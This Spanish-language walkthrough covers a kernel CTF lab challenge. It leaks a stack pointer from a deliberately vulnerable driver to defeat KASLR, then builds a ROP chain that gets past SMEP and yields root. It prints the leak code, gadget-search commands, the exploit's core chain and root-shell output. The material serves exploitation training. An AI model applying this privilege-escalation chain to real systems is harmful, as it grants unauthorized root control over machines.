# CH02 — Echo Chamber v2: leak de KASLR + ROP con SMEP

**Nivel recomendado:** 2 (SMEP + KASLR)
**Dispositivo:** `/dev/echo2` (`read` / `write`)
**Concepto nuevo:** con SMEP ya no puedes ejecutar código de usuario desde ring 0. Hay que encadenar gadgets del propio kernel (ROP) y, como la base de KASLR cambia en cada arranque, primero hay que filtrarla.

---

## Objetivo

Igual que CH01: `uid=0(root)` y leer `/root/flag.txt`. Ahora el overflow no basta: necesitas dos cosas más.

---

## Paso 1: qué cambia respecto a CH01

Lee `src/ch02-echo-chamber-v2/vuln_echo2.c`. Hay dos bugs:

1. **`echo2_write`**: mismo overflow que CH01, sin límite en `count`.
2. **`echo2_read`**: copia hasta `LEAK_MAX` (256) bytes desde un buffer de 64 bytes, de los que solo `saved_len` están inicializados. Los demás son bytes de pila sin limpiar.

El segundo bug es un **leak de información**. Con él obtienes punteros del kernel desde espacio de usuario.

| Mitigación | Efecto |
|---|---|
| SMEP | El kernel no puede ejecutar código en páginas de usuario. El ret2usr de CH01 falla. |
| KASLR | La base del kernel cambia en cada arranque. Las direcciones que copiaste de otra VM no sirven. |

> **Nota del laboratorio.** Igual que en CH01, el módulo usa `raw_copy_to_user` / `raw_copy_from_user` y no tiene canario de pila, para que el overflow y el leak sean alcanzables.

---

## Paso 2: el leak

Escribe 8 bytes (para fijar `saved_len = 8`) y lee 256:

```c
write(fd, "AAAAAAAA", 8);
read(fd, buf, 256);
```

Después vuelca `buf` en palabras de 8 bytes. Puedes usar [`leak.c`](ch02-echo-chamber-v2/leak.c). Salida real:

```
+048: ffff93dec1fc2c00    ← rbp guardado (puntero de heap)
+050: ffffffff8d02eb10    ← dirección de retorno: dentro de vfs_read
+058: ffffffff8d02f2b2
```

El desplazamiento `0x50` es la dirección de retorno de `echo2_read` (igual que en CH01, `64 + rbx + rbp`). Apunta a la llamada dentro de `vfs_read` que invoca `f_op->read`.

---

## Paso 3: de la dirección filtrada a la base de KASLR

Busca en `vmlinux` la dirección sin KASLR de ese punto de retorno. Con el árbol de compilación:

```bash
cd /opt/kernel-ctf-lab/linux-6.1.75
nm vmlinux | grep ' vfs_read$'
# ffffffff8122ea70 T vfs_read

objdump -d --no-show-raw-insn vmlinux | sed -n '/<vfs_read>:/,/^$/p' | grep -n 'call.*indirect_thunk_array'
# ...ffffffff8122eb0b: call  __x86_indirect_thunk_array
```

La llamada está en `0xffffffff8122eb0b` y mide 5 bytes. La dirección de retorno es `0xffffffff8122eb10`.

```
KASLR = leak − 0xffffffff8122eb10
      = 0xffffffff8d02eb10 − 0xffffffff8122eb10
      = 0x0c000000
```

Con ese valor, cualquier símbolo del kernel en runtime es `link + KASLR`. Por ejemplo, `commit_creds` queda en `0xffffffff8109a930 + KASLR`.

> Al arrancar de nuevo la VM, la base cambia. Repite el leak en cada ejecución; no uses valores de otra sesión.

---

## Paso 4: gadgets

Con SMEP, el ROP debe apuntar a código ya presente en el kernel. Necesitas:

| Gadget | Dirección (link) | Para qué |
|---|---|---|
| `pop %rdi ; jmp __x86_return_thunk` | `0xffffffff814bc81c` | Cargar el primer argumento |
| `init_cred` (dato) | `0xffffffff828519e0` | Cred de root del kernel |
| `commit_creds` | `0xffffffff8109a930` | Aplicar las credenciales |
| `swapgs_restore_regs_and_return_to_usermode` | `0xffffffff81e00f10` | Volver a ring 3 |

Buscar el primer gadget:

```bash
objdump -d --no-show-raw-insn vmlinux > /tmp/vmlinux.dis
grep -B1 -P "^\s+[0-9a-f]+:\s+jmp\s+[0-9a-f]+ <__x86_return_thunk>" /tmp/vmlinux.dis \
  | grep -P "pop\s+%rdi$"
# ffffffff814bc81c:	pop    %rdi
```

> **Por qué `init_cred` y no `prepare_kernel_cred(0)`.** `prepare_kernel_cred(0)` devuelve root, pero habría que pasar su resultado a `commit_creds` con otro gadget (`mov %rax,%rdi`). Como `init_cred` ya es una estructura de root, `commit_creds(&init_cred)` basta con un solo gadget.

---

## Paso 5: la cadena

El payload tiene tres partes:

1. **Relleno (80 bytes)** para llegar a la dirección de retorno.
2. **Cadena ROP** que se ejecuta al salir de `echo2_write`:

```
[ pop rdi ]               ← ret pasa aquí
[ &init_cred ]            ← valor para rdi
[ commit_creds ]          ← ret pasa aquí, rdi = &init_cred
[ swapgs_restore ]        ← ret pasa aquí
[ 14 valores ]            ← los 14 pops de swapgs_restore (basura, 0)
[ pad ]                   ← rdi del marco de pt_regs
[ orig_rax ]
[ RIP ]   = get_root_shell
[ CS ]    = cs de usuario
[ RFLAGS ]= rflags de usuario
[ RSP ]   = rsp de usuario
[ SS ]    = ss de usuario
```

Los 14 pops y el marco de `iretq` salen de leer `swapgs_restore_regs_and_return_to_usermode` en `vmlinux` (objdump a partir de `0xffffffff81e00f10`): primero hay 14 `pop`, después `mov %rsp,%rdi` y los `push` del marco.

Los valores de usuario se guardan en `main` antes del overflow, con `pushfq`, `movq %cs`, `movq %ss` y `movq %rsp`.

---

## Paso 6: el exploit

Código completo en [`ch02-echo-chamber-v2/exploit.c`](ch02-echo-chamber-v2/exploit.c). Núcleo:

```c
chain[n++] = LINK_POP_RDI_RET + kaslr;
chain[n++] = LINK_INIT_CRED + kaslr;
chain[n++] = LINK_COMMIT_CREDS + kaslr;
chain[n++] = LINK_SWAPGS_RESTORE + kaslr;
for (i = 0; i < 14; i++) chain[n++] = 0;
chain[n++] = 0;                              /* pad */
chain[n++] = 0;                              /* orig_rax */
chain[n++] = (unsigned long)get_root_shell;  /* RIP */
chain[n++] = user_cs;
chain[n++] = user_rflags;
chain[n++] = user_sp;
chain[n++] = user_ss;

memcpy(payload + BUF_OFFSET, chain, n * sizeof(unsigned long));
write(fd, payload, BUF_OFFSET + n * sizeof(unsigned long));
```

Compilar y ejecutar:

```bash
gcc -static -O0 -fno-stack-protector -o exploit exploit.c
cp exploit ../challenges/ch02-echo-chamber-v2/shared/
cd ../challenges/ch02-echo-chamber-v2 && ./run.sh 2
```

Dentro de la VM:

```
~ $ /shared/exploit
[*] leak return addr  = 0xffffffff8d02eb10
[*] KASLR offset      = 0x0c000000   ← ejemplo; cambia en cada arranque
[*] ROP de 25 qwords, escribiendo 280 bytes
[+] uid=0, lanzando shell de root
~ # cat /root/flag.txt
FLAG{...}
```

---

## Problemas comunes

| Síntoma | Causa probable |
|---|---|
| `leak return addr` no termina en `b10` | El `read` no devolvió los 256 bytes o no escribiste los 8 bytes previos (`saved_len` = 0). |
| Kernel panic tras el `write` | El número de pops de `swapgs_restore` o el orden del marco no coincide con el `objdump` de tu `vmlinux`. |
| Shell pero `uid=1000` | `commit_creds` no se ejecutó: revisa la dirección del gadget `pop %rdi`. |
| Funciona en un arranque y en otro no | Te olvidaste de repetir el leak; la base cambia en cada arranque. |

---

## Qué aprendiste

- Un leak de pila basta para romper KASLR si la pila contiene direcciones de retorno.
- Con KASLR, el desplazamiento entre un puntero filtrado y el símbolo de `vmlinux` es constante: el build es el mismo.
- ROP reutiliza código existente del kernel; los gadgets salen de `objdump`.
- `init_cred` evita un gadget extra cuando solo necesitas root.
- Volver a ring 3 sigue requiriendo el marco de `iretq`; la rutina `swapgs_restore...` lo consume.

**Anterior:** [CH01](ch01-echo-chamber.md) · **Siguiente:** CH03 (pendiente de guía).
